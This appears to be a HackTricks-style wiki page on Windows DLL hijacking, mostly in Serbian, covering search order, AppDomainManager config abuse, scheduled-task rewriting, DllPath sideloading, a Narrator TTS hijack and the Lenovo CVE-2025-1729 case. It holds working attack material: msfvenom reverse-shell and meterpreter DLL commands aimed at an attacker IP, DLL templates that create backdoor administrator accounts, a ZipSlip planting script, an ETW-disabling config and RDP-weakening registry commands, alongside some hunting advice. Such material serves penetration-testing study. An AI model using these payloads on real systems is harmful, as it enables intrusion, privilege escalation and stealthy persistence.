# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking uključuje manipulisanje trusted aplikacijom da učita malicious DLL. Ovaj termin obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection, i Side-Loading**. Najčešće se koristi za code execution, postizanje persistence, i, ređe, privilege escalation. Uprkos fokusu na escalation ovde, metoda hijacking-a ostaje dosledna kroz sve ciljeve.

### Common Techniques

Koristi se nekoliko metoda za DLL hijacking, a svaka ima svoju efikasnost u zavisnosti od DLL loading strategije aplikacije:

1. **DLL Replacement**: Zamena pravog DLL-a malicious-om, opciono uz korišćenje DLL Proxying da bi se zadržala originalna funkcionalnost DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje malicious DLL-a u search path ispred legitimnog, iskorišćavajući obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje malicious DLL-a koji će aplikacija učitati, misleći da je to nepostojeći required DLL.
4. **DLL Redirection**: Izmena search parametara kao što su `%PATH%` ili `.exe.manifest` / `.exe.local` fajlovi da bi se aplikacija usmerila na malicious DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a malicious pandanom u WinSxS direktorijumu, metoda koja se često povezuje sa DLL side-loading.
6. **Relative Path DLL Hijacking**: Postavljanje malicious DLL-a u direktorijum pod kontrolom korisnika zajedno sa kopiranom aplikacijom, što podseća na Binary Proxy Execution tehnike.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading nije jedini način da se trusted **.NET Framework** proces natera da učita attacker code. Ako je target executable **managed** aplikacija, CLR takođe proverava **application configuration file** nazvan po izvršnom fajlu (na primer `Setup.exe.config`). Taj fajl može da definiše custom **AppDomainManager**. Ako config pokazuje na attacker-controlled assembly postavljen pored EXE-a, CLR ga učitava **pre normalne code path aplikacije** i izvršava unutar trusted procesa.

Prema Microsoft-ovoj .NET Framework configuration schema, i `<appDomainManagerAssembly>` i `<appDomainManagerType>` moraju biti prisutni da bi se koristio custom manager.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimalni manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktične napomene:
- Ovo je tradecraft specifičan za **.NET Framework**. Zavisi od CLR config parsiranja, a ne od Win32 DLL search order.
- Host mora zaista biti **managed EXE**. Brza provera: `sigcheck -m target.exe`, `corflags target.exe`, ili proveri **CLR Runtime Header** u PE metadata.
- Ime config fajla mora tačno da odgovara imenu izvršnog fajla (`<binary>.config`) i obično se nalazi **pored EXE-a**.
- Ovo je korisno sa **signed Microsoft/vendor binaries** zato što trusted EXE ostaje netaknut dok malicious managed assembly izvršava in-process.
- Ako već imaš writable installer/update direktorijum, AppDomainManager hijacking može da se koristi kao **first stage**, a zatim classic DLL sideloading ili reflective loading za kasnije faze.

### Hijacking existing scheduled task da bi se ponovo pokrenuo sideload chain

Za persistence, nemoj tražiti samo **kreiranje novog taska**. Neki intrusion setovi čekaju da legitiman installer napravi **normal updater task**, pa onda **prepišu task action** tako da postojeći name, author i trigger ostanu poznati defenderima.

Reusable workflow:
1. Instaliraj/pokreni legitimni software i identifikuj task koji obično kreira.
2. Exportuj task XML i zabeleži trenutne vrednosti `<Exec><Command>` / `<Arguments>`.
3. Zameni samo action tako da task pokreće tvoj **trusted host EXE** iz user-writable staging direktorijuma, koji zatim side-load-uje ili AppDomain-load-uje pravi payload.
4. Ponovo registruj isti task name umesto da kreiraš novi očigledan persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Zašto je stealthier:
- Ime taska i dalje može izgledati legitimno (na primer vendor updater).
- **Task Scheduler service** ga pokreće, pa parent/ancestor validacija često vidi očekivani scheduling chain umesto `explorer.exe`.
- DFIR timovi koji traže samo **nove task name-ove** mogu propustiti task čija je registracija već postojala, ali čija action sada pokazuje na `%LOCALAPPDATA%`, `%APPDATA%`, ili neku drugu attacker-controlled putanju.

Brzi hunting pivoti:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Uporedite `C:\Windows\System32\Tasks\*` XML i `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata sa baseline-om.
- Alertujte kada **vendor-looking updater task** izvršava iz **user-writable directories** ili pokreće .NET EXE sa pratećim `*.config` fajlom.

> [!TIP]
> Za chain korak-po-korak koji kombinuje HTML staging, AES-CTR configs, i .NET implants na vrhu DLL sideloading, pregledajte workflow ispod.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Najčešći način da se pronađu missing Dlls unutar sistema je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals, **podešavanje** sledeća **2 filtera**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

i prikazivanje samo **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Ako tražite **missing dlls uopšteno**, ostavite ovo da radi nekoliko **sekundi**.\
Ako tražite **missing dll unutar određenog executable-a**, treba da postavite **drugi filter kao "Process Name" "contains" `<exec name>`, pokrenete ga, i zaustavite snimanje događaja**.

## Exploiting Missing Dlls

Da bismo eskalirali privilegije, najbolja šansa je da možemo da **upišemo dll koji će privilegovani process pokušati da učita** na nekom od **mesta gde će biti tražen**. Zato ćemo moći da **upišemo** dll u **folder** gde se **dll traži pre** foldera gde se nalazi **originalni dll** (neobičan slučaj), ili ćemo moći da **upišemo u neki folder gde će dll biti tražen** i originalni **dll ne postoji** ni u jednom folderu.

### Dll Search Order

**Unutar** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se Dlls konkretno učitavaju.**

**Windows applications** traže DLL-ove tako što prate skup **predefinisanih search paths**, redosledom određenim posebnom sekvencom. Problem DLL hijacking-a nastaje kada se zlonamerni DLL strateški postavi u jedan od ovih direktorijuma, obezbeđujući da bude učitan pre autentčnog DLL-a. Rešenje za ovo je da aplikacija koristi apsolutne putanje kada referencira DLL-ove koji su joj potrebni.

Možete videti **DLL search order na 32-bit** sistemima ispod:

1. Direktorijum iz kog je aplikacija učitana.
2. System direktorijum. Koristite [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) funkciju da dobijete putanju ovog direktorijuma.(_C:\Windows\System32_)
3. 16-bit system direktorijum. Ne postoji funkcija koja dobija putanju ovog direktorijuma, ali se on pretražuje. (_C:\Windows\System_)
4. Windows direktorijum. Koristite [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) funkciju da dobijete putanju ovog direktorijuma.
1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi navedeni u PATH environment variable. Obratite pažnju da ovo ne uključuje per-application path definisan kroz **App Paths** registry key. **App Paths** key se ne koristi pri računanju DLL search path-a.

To je **default** search order sa uključenim **SafeDllSearchMode**. Kada je onemogućen, current directory se pomera na drugo mesto. Da biste isključili ovu funkciju, napravite **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value i postavite ga na 0 (default je enabled).

Ako se [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funkcija pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu executable modula koji **LoadLibraryEx** učitava.

Na kraju, obratite pažnju da se **dll može učitati tako što se navede apsolutna putanja umesto samo imena**. U tom slučaju će se taj dll **tražiti samo na toj putanji** (ako dll ima zavisnosti, one će biti tražene kao da su upravo učitane po imenu).

Postoje i drugi načini da se izmeni redosled pretrage, ali ih ovde neću objašnjavati.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Koristite **ProcMon** filtere (`Process Name` = target EXE, `Path` završava sa `.dll`, `Result` = `NAME NOT FOUND`) da prikupite DLL imena koja process pokušava da pronađe, ali ne može.
2. Ako binary radi po **schedule/service**, dropovanje DLL-a sa jednim od tih imena u **application directory** (search-order entry #1) biće učitano pri sledećem izvršavanju. U jednom .NET scanner slučaju process je tražio `hostfxr.dll` u `C:\samples\app\` pre nego što je učitao pravi copy iz `C:\Program Files\dotnet\fxr\...`.
3. Napravite payload DLL (npr. reverse shell) sa bilo kojim export-om: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ako je vaša primitive **ZipSlip-style arbitrary write**, napravite ZIP čiji entry izlazi iz extraction dir-a tako da DLL završi u app folder-u:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostavite arhivu u nadgledani inbox/share; kada zakazani task ponovo pokrene process, on učitava malicious DLL i izvršava vaš code kao service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način da deterministički utičete na DLL search path novokreiranog processa jeste da postavite polje DllPath u RTL_USER_PROCESS_PARAMETERS pri kreiranju processa pomoću ntdll native APIs. Ako ovde navedete attacker-controlled directory, target process koji rešava imported DLL po imenu (bez absolute path i bez korišćenja safe loading flags) može biti primoran da učita malicious DLL iz tog direktorijuma.

Ključna ideja
- Napravite process parameters pomoću RtlCreateProcessParametersEx i obezbedite custom DllPath koji pokazuje na vaš controlled folder (npr. direktorijum gde se nalazi vaš dropper/unpacker).
- Kreirajte process pomoću RtlCreateUserProcess. Kada target binary rešava DLL po imenu, loader će konsultovati ovaj navedeni DllPath tokom resolution, omogućavajući pouzdano sideloading čak i kada malicious DLL nije smešten pored target EXE.

Napomene/ograničenja
- Ovo utiče na child process koji se kreira; razlikuje se od SetDllDirectory, koji utiče samo na current process.
- Target mora da importuje ili pozove LoadLibrary na DLL po imenu (bez absolute path i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardcoded absolute paths ne mogu biti hijacked. Forwarded exports i SxS mogu promeniti precedence.

Minimalni C primer (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operativni primer upotrebe
- Postavite zlonamerni xmllite.dll (koji eksportuje potrebne funkcije ili proxy-uje pravi) u vaš DllPath direktorijum.
- Pokrenite potpisani binary za koji je poznato da traži xmllite.dll po imenu koristeći gornju tehniku. Loader rešava import preko prosleđenog DllPath i sideloads vašu DLL.

Ova tehnika je primećena u praksi kako pokreće višefazne sideloading lance: početni launcher otpušta pomoćnu DLL, koja zatim pokreće Microsoft-signed, hijackable binary sa custom DllPath da bi prinudno učitala attacker-ovu DLL iz staging direktorijuma.


### .NET AppDomainManager hijacking via `.exe.config`

Za **.NET Framework** mete, sideloading može da se uradi **pre `Main()`** bez patchovanja memorije zloupotrebom aplikacionog pratećeg **`.exe.config`** fajla. Umesto da se oslanja samo na Win32 DLL search order, attacker postavlja legitiman .NET EXE pored zlonamernog config-a i jednog ili više assembly-ja pod attacker kontrolom.

Kako lanac radi:
1. Host EXE se pokreće i **CLR čita `<exe>.config`**.
2. Config postavlja **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`** tako da runtime instancira attacker-controlled `AppDomainManager`.
3. Zlonamerni manager dobija **pre-`Main()` execution** unutar trusted host procesa.
4. Isti config može da natera CLR da prvo razrešava lokalne assembly-je (na primer `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) i može da oslabi runtime validation/telemetry bez inline patchovanja.

Campaign-style obrazac (tačno ugnježđivanje može da varira u zavisnosti od directive / CLR verzije):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Why this is useful:
- **`<probing privatePath="."/>`** drži assembly resolution u direktorijumu aplikacije, pretvarajući folder u predvidivu sideloading površinu.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** premeštaju izvršavanje u attacker code tokom CLR initialization, pre nego što se pokrene legitimna app logika.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** može omogućiti full-trust app da učita unsigned ili tampered assemblies bez strong-name validation failure.
- **`<publisherPolicy apply="no"/>`** izbegava publisher-policy redirekcije ka novijim assemblies.
- **`<requiredRuntime ... safemode="true"/>`** čini runtime selection determinističnijim.
- **`<etwEnable enabled="false"/>`** je posebno interesantno zato što **CLR isključuje sopstvenu ETW vidljivost** iz konfiguracije umesto da implant patchuje `EtwEventWrite` u memoriji.

Operational pattern seen in recent campaigns:
- Stage 1 drops `setup.exe`, `setup.exe.config`, and local assemblies.
- Stage 2 copies them into a believable **AppData update** folder, renames the host to something like `update.exe`, and relaunches it via a **scheduled task**.
- Stage 3 verifies execution context (for example expected parent `svchost.exe` from Task Scheduler) before loading the final RAT DLL/export.

Hunting ideas:
- Signed or otherwise legitimate **.NET executables** running with suspicious adjacent **`.config`** files in user-writable locations.
- `.config` files containing **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, or **`etwEnable enabled="false"`**.
- Scheduled tasks that relaunch renamed update binaries from **`%LOCALAPPDATA%`** or app-specific `\bin\update\` directories.
- Parent/child chains where a scheduled task launches a trusted .NET host that immediately loads non-vendor assemblies from its own directory.

#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Da, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proveri dozvole svih foldera unutar PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti imports executable-a i exports dll-a sa:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za potpun vodič o tome kako da **zloupotrebiš Dll Hijacking za eskalaciju privilegija** sa dozvolom za pisanje u folderu **System Path** pogledaj:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatski alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)će proveriti da li imaš dozvole za pisanje u bilo kom folderu unutar system PATH.\
Drugi zanimljivi automatski alati za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Primer

U slučaju da pronađeš scenario koji se može iskoristiti, jedna od najvažnijih stvari za uspešno iskorišćavanje bila bi da **napraviš dll koji eksportuje bar sve funkcije koje će izvršni fajl importovati iz njega**. Ipak, imaj na umu da Dll Hijacking može biti koristan da bi se [eskaliralo sa Medium Integrity level na High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili sa[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Možeš pronaći primer **kako da napraviš validan dll** unutar ove studije o dll hijacking-u fokusirane na izvršavanje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Takođe, u **sledećem odeljku** možeš pronaći neke **osnovne dll kodove** koji mogu biti korisni kao **šabloni** ili za pravljenje **dll-a sa eksportovanim funkcijama koje nisu potrebne**.

## **Kreiranje i kompajliranje Dllova**

### **Dll Proxifying**

U osnovi, **Dll proxy** je Dll sposoban da **izvrši tvoj zlonamerni kod kada se učita**, ali i da **izloži** i **radi** kako se **očekuje** tako što **prosleđuje sve pozive pravoj biblioteci**.

Sa alatom [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) zapravo možeš da **navedeš izvršni fajl i izabereš biblioteku** koju želiš da proxifikuješ i da **generišeš proxified dll** ili da **navedeš Dll** i da **generišeš proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Dobij meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreirajte korisnika (x86 nisam video x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

Imajte na umu da u nekoliko slučajeva Dll koji kompajlirate mora da **izveze nekoliko funkcija** koje će učitavati žrtvin proces, ako te funkcije ne postoje **binary neće moći da ih učita** i **exploit će fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL sa thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe i dalje pri startovanju proverava predvidljivu, jezički specifičnu localization DLL i ta DLL može da se hijackuje za proizvoljno izvršavanje koda i persistence.

Ključne činjenice
- Putanja provere (trenutni buildovi): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy putanja (stariji buildovi): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako postoji upisiva DLL pod kontrolom napadača na OneCore putanji, ona se učitava i izvršava se `DllMain(DLL_PROCESS_ATTACH)`. Exporti nisu potrebni.

Otkrivanje pomoću Procmon
- Filter: `Process Name is Narrator.exe` i `Operation is Load Image` ili `CreateFile`.
- Pokrenite Narrator i posmatrajte pokušaj učitavanja gore navedene putanje.

Minimalna DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC tišina
- Naivan hijack će govoriti/istaknuti UI. Da bi ostao tih, pri attach-u enumeriši Narrator thread-ove, otvori glavni thread (`OpenThread(THREAD_SUSPEND_RESUME)`) i `SuspendThread` ga; nastavi u sopstvenom thread-u. Vidi PoC za kompletan kod.

Trigger i persistence putem Accessibility konfiguracije
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Sa navedenim, pokretanje Narrator učitava planted DLL. Na secure desktop-u (logon ekran), pritisni CTRL+WIN+ENTER da pokreneš Narrator; tvoj DLL se izvršava kao SYSTEM na secure desktop-u.

RDP-triggered SYSTEM execution (lateral movement)
- Dozvoli klasični RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na host, na logon ekranu pritisni CTRL+WIN+ENTER da pokreneš Narrator; tvoj DLL se izvršava kao SYSTEM na secure desktop-u.
- Izvršavanje prestaje kada se RDP session zatvori—ubrizgaj/migriraj odmah.

Bring Your Own Accessibility (BYOA)
- Možeš da kloniraš ugrađeni Accessibility Tool (AT) registry unos (npr. CursorIndicator), izmeniš ga da pokazuje na proizvoljni binary/DLL, importuješ ga, a zatim postaviš `configuration` na naziv tog AT-a. Ovo proxy-uje proizvoljno izvršavanje kroz Accessibility framework.

Napomene
- Upis u `%windir%\System32` i menjanje HKLM vrednosti zahteva admin prava.
- Sva payload logika može da živi u `DLL_PROCESS_ATTACH`; eksporti nisu potrebni.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ovaj primer pokazuje **Phantom DLL Hijacking** u Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), praćen kao **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` lociran u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se pokreće svakog dana u 9:30 AM pod kontekstom prijavljenog korisnika.
- **Directory Permissions**: Mogu da pišu `CREATOR OWNER`, što lokalnim korisnicima omogućava da ubace proizvoljne fajlove.
- **DLL Search Behavior**: Pokušava da učita `hostfxr.dll` iz svog working directory prvo i beleži "NAME NOT FOUND" ako nedostaje, što ukazuje na lokalni directory search precedence.

### Exploit Implementation

Napadač može da postavi malicious `hostfxr.dll` stub u isti direktorijum, iskorišćavajući nedostajući DLL da postigne code execution pod korisničkim kontekstom:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Kao standardni user, ubaci `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekaj da se scheduled task pokrene u 9:30 AM pod kontekstom trenutnog korisnika.
3. Ako je administrator prijavljen kada se task izvrši, malicious DLL će se pokrenuti u administratorovoj sesiji sa medium integrity.
4. Poveži standard UAC bypass tehnike da podigneš privilegije sa medium integrity na SYSTEM privileges.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors često kombinuju MSI-based droppers sa DLL side-loading da bi izvršili payload pod trusted, signed procesom.

Chain overview
- User preuzima MSI. CustomAction se tiho pokreće tokom GUI instalacije (npr. LaunchApplication ili VBScript action), rekonstruišući sledeću fazu iz embedded resources.
- Dropper upisuje legitimni, signed EXE i malicious DLL u isti direktorijum (primer: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Kada se signed EXE pokrene, Windows DLL search order prvo učitava wsc.dll iz working directory, izvršavajući attacker code pod signed parent procesom (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Traži unose koji pokreću executables ili VBScript. Primer sumnjivog patterna: LaunchApplication koji izvršava embedded file u pozadini.
- U Orca (Microsoft Orca.exe), pregledaj CustomAction, InstallExecuteSequence i Binary tables.
- Embedded/split payloads u MSI CAB:
